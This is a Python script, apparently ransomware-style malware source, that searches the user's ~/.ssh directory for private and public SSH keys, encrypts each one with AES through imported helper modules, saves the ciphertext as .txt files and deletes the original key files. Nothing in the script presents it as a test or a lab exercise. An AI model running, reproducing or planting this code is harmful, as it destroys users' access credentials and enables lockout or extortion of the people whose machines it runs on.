import os
import time
import re

from utils.checkKey import is_private_key, is_public_key
from utils.keysInteract import *
from utils.aesKeyGen import *
from utils.ivGenerate import *

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad


def main():
    ssh_dir = os.path.expanduser('~/.ssh')
    keys_found = False

    private_keys_content = {}
    public_keys_content = {}

    try:
        if os.path.exists(ssh_dir):
            print(f"Found .ssh directory, checking for keys... (waiting 3 seconds)")
            time.sleep(3)  # Wait for 3 seconds

            ssh_keys = find_ssh_keys(ssh_dir)

            if ssh_keys['private_keys'] or ssh_keys['public_keys']:
                keys_found = True
                if ssh_keys['private_keys']:
                    print("Private SSH keys found:")
                    for key in ssh_keys['private_keys']:
                        print(f"  - {key}")
                if ssh_keys['public_keys']:
                    print("Public SSH keys found:")
                    for key in ssh_keys['public_keys']:
                        print(f"  - {key}")

            else:
                print("No SSH keys found in .ssh directory.")
        else:
            print(".ssh directory does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")

    # If keys are found, proceed with encryption
    if keys_found:
        try:
            # Generate or load AES key for encryption
            generate_aes_key()
            aes_key = load_aes_key()

            # Generate or load IV
            if not os.path.exists(IV_FILE_PATH):
                generate_iv()
            iv = load_iv()

            for private_key in ssh_keys['private_keys']:
                private_key_path = os.path.join(ssh_dir, private_key)
                content = read_key(private_key_path)
                if content:
                    private_keys_content[private_key] = content

                    # Encrypt private key
                    encrypted_key = encrypt_key(content, aes_key, iv)
                    print(f"Encrypted private key for {private_key}.")

                    # Save encrypted private key to a .txt file
                    encrypted_key_filename = f"{private_key}.txt"
                    save_encrypted_key(encrypted_key_filename, encrypted_key)
                    print(f"Saved encrypted key to {encrypted_key_filename}.")

                    # Delete the original key file after encryption
                    delete_key(private_key_path)

            for public_key in ssh_keys['public_keys']:
                public_key_path = os.path.join(ssh_dir, public_key)
                content = read_key(public_key_path)
                if content:
                    public_keys_content[public_key] = content

                    # Encrypt public key
                    encrypted_key = encrypt_key(content, aes_key, iv)
                    print(f"Encrypted public key for {public_key}.")

                    # Save encrypted public key to a .txt file
                    encrypted_key_filename = f"{public_key}.txt"
                    save_encrypted_key(encrypted_key_filename, encrypted_key)
                    print(f"Saved encrypted key to {encrypted_key_filename}.")

                    # Delete the original key file after encryption
                    delete_key(public_key_path)

        except Exception as e:
            print(f"An error occurred while encrypting keys: {e}")

if __name__ == "__main__":
    main()